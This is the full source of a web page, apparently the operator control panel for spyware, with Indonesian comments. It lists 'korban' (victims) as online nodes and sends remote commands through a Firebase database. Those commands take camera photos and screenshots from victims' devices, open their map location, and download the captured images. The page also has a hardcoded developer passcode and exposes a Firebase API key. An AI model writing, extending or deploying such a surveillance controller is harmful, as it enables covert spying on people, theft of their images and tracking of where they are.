<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>THE PURPLE METEOR | DEV EDITION</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <style>
        :root { --crystal: rgba(168, 85, 247, 0.2); --neon: #c084fc; --deep: #0a0514; --gold: #fde047; }
        body { background: var(--deep); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; overflow: hidden; }
        
        /* METEOR ANIMATION */
        .meteor-box { position: fixed; inset: 0; pointer-events: none; z-index: 0; }
        .meteor { position: absolute; width: 2px; height: 80px; background: linear-gradient(to bottom, transparent, var(--neon)); animation: fall 3s linear infinite; }
        @keyframes fall { 
            0% { transform: translateY(-100px) translateX(100px) rotate(-45deg); opacity: 0; }
            50% { opacity: 1; }
            100% { transform: translateY(100vh) translateX(-100vh) rotate(-45deg); opacity: 0; }
        }

        /* UI ELEMENTS */
        #login-screen { position: fixed; inset: 0; background: var(--deep); display: flex; align-items: center; justify-content: center; z-index: 10000; }
        .glass { background: var(--crystal); backdrop-filter: blur(15px); border: 1px solid rgba(255,255,255,0.1); padding: 25px; border-radius: 20px; width: 85%; max-width: 350px; text-align: center; }
        input { background: rgba(0,0,0,0.3); border: 1px solid var(--neon); border-radius: 10px; padding: 12px; color: white; width: 100%; box-sizing: border-box; margin-bottom: 10px; }
        .btn { background: linear-gradient(45deg, #7c3aed, var(--neon)); color: white; border: none; padding: 12px; border-radius: 10px; width: 100%; font-weight: bold; cursor: pointer; box-shadow: 0 0 15px rgba(124,58,237,0.4); }
        
        .container { position: relative; z-index: 1; padding: 20px; height: 100vh; overflow-y: auto; padding-bottom: 80px; }
        .node-card { background: var(--crystal); border-left: 4px solid var(--neon); padding: 15px; margin-bottom: 10px; border-radius: 10px; display: flex; justify-content: space-between; align-items: center; }
        .badge { font-size: 10px; background: var(--neon); color: black; padding: 3px 7px; border-radius: 5px; font-weight: bold; }
    </style>
</head>
<body onload="checkAuth()">

<div class="meteor-box" id="meteors"></div>

<div id="login-screen">
    <div class="glass">
        <h2 style="color:var(--neon); letter-spacing:3px;">THE METEOR</h2>
        <input type="password" id="entry-key" placeholder="MASTER/USER KEY">
        <button class="btn" onclick="login()">IGNITE ACCESS</button>
    </div>
</div>

<div class="container">
    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
        <h3 id="display-name" style="margin:0; color:var(--neon);">Syncing...</h3>
        <span id="display-role" class="badge">...</span>
    </div>

    <div id="radar-section">
        <h4 style="opacity:0.7;">🛰️ ACTIVE SIGNALS</h4>
        <div id="node-list"></div>
    </div>

    <div id="node-view" style="margin-top:20px;"></div>

    <div id="admin-panel" style="display:none; margin-top:30px; border-top: 1px solid rgba(192,132,252,0.2); padding-top:20px;">
        <h4 style="color:var(--gold);">🛡️ USER MANAGEMENT</h4>
        <div id="management-tools"></div>
    </div>
</div>

<script>
    // --- DATABASE CONFIG ---
    const config = { apiKey: "AIzaSyAqdcpcUxfUBNY2H83IBa1Pp0X6YcQtDlQ", databaseURL: "https://theeyes-8d0aa-default-rtdb.asia-southeast1.firebasedatabase.app" };
    firebase.initializeApp(config); const db = firebase.database();

    let currentUser = null;

    function createMeteors() {
        const box = document.getElementById('meteors');
        for(let i=0; i<12; i++) {
            let m = document.createElement('div');
            m.className = 'meteor';
            m.style.left = Math.random() * 100 + '%';
            m.style.animationDelay = Math.random() * 3 + 's';
            box.appendChild(m);
        }
    }

    async function login() {
        const key = document.getElementById('entry-key').value;
        
        // 1. Cek Apakah Developer (Hardcoded)
        if(key === "dev111") {
            const devData = { n: "Kalz", r: "DEVELOPER", p: 100 };
            sessionStorage.setItem('meteor_session', JSON.stringify(devData));
            location.reload();
            return;
        }

        // 2. Cek Database untuk User yang Lu Buat
        db.ref('users/' + key).once('value', snap => {
            if(snap.exists()) {
                sessionStorage.setItem('meteor_session', JSON.stringify(snap.val()));
                location.reload();
            } else {
                alert("ACCESS DENIED: KEY NOT FOUND");
            }
        });
    }

    function checkAuth() {
        const session = sessionStorage.getItem('meteor_session');
        if(session) {
            currentUser = JSON.parse(session);
            document.getElementById('login-screen').style.display = 'none';
            createMeteors();
            renderUI();
        }
    }

    function renderUI() {
        document.getElementById('display-name').innerText = `💎 ${currentUser.n}`;
        document.getElementById('display-role').innerText = currentUser.r;

        // Render Management Tools berdasarkan Role
        const panel = document.getElementById('admin-panel');
        const tools = document.getElementById('management-tools');
        
        if(currentUser.p > 1) { // Selain Member
            panel.style.display = 'block';
            let html = "";
            if(currentUser.r === "DEVELOPER") {
                html += btnHtml('OWNER', '#d946ef');
                html += btnHtml('ADMIN', '#6366f1');
            }
            if(currentUser.r === "DEVELOPER" || currentUser.r === "OWNER") {
                html += btnHtml('ADMIN', '#6366f1');
            }
            html += btnHtml('MEMBER', '#a855f7');
            tools.innerHTML = html;
        }

        listenNodes();
    }

    function btnHtml(role, color) {
        return `<button class="btn" style="background:${color}; margin-bottom:10px;" onclick="createUser('${role}')">➕ CREATE ${role}</button>`;
    }

    function createUser(role) {
        const name = prompt(`Nama ${role}:`);
        const key = prompt(`Set Passcode untuk ${name}:`);
        if(name && key) {
            const pLevel = role === 'OWNER' ? 3 : (role === 'ADMIN' ? 2 : 1);
            db.ref('users/' + key).set({
                n: name,
                r: role,
                p: pLevel
            }).then(() => alert(`Berhasil! ${name} sekarang ${role}. Passcode: ${key}`));
        }
    }

    function listenNodes() {
        db.ref('korban').on('value', s => {
            let h = "";
            s.forEach(c => {
                h += `<div class="node-card" onclick="viewNode('${c.key}')">
                        <div><b>NODE_${c.key.substring(1,7)}</b></div>
                        <span class="badge">📡 ONLINE</span>
                      </div>`;
            });
            document.getElementById('node-list').innerHTML = h || "Waiting for signals...";
        });
    }

    function viewNode(id) {
        db.ref('korban/'+id).once('value', s => {
            const k = s.val();
            document.getElementById('node-view').innerHTML = `
                <div class="glass" style="width:100%; box-sizing:border-box;">
                    <h4 style="color:var(--neon); margin:0;">CONTROL NODE</h4>
                    <p style="font-size:10px; opacity:0.7;">ID: ${id}</p>
                    <div style="display:grid; grid-template-columns: 1fr 1fr; gap:10px; margin-top:15px;">
                        <button class="btn" onclick="exec('${id}','TAKE')">📸 SNAP</button>
                        <button class="btn" onclick="exec('${id}','SHOT')">🖼️ SHOT</button>
                        <button class="btn" style="grid-column:span 2; background:white; color:black;" onclick="window.open('${k.maps}')">🌍 MAPS</button>
                    </div>
                    <div id="img-output" style="margin-top:15px;"></div>
                </div>`;
            
            db.ref('hasil_foto/'+id).on('value', f => {
                if(f.val()) document.getElementById('img-output').innerHTML = `
                    <img src="${f.val().foto}" style="width:100%; border-radius:10px; border:1px solid var(--neon);">
                    <button class="btn" style="background:#22c55e; margin-top:10px" onclick="dl('${f.val().foto}')">📥 DOWNLOAD</button>`;
            });
        });
    }

    function exec(id, a) { db.ref('commands/'+id).set({ action: a, t: Date.now() }); alert("Signal Pushed!"); }
    function dl(b) { const a = document.createElement('a'); a.href = b; a.download = `IMG_${Date.now()}.jpg`; a.click(); }
</script>
</body>
</html>
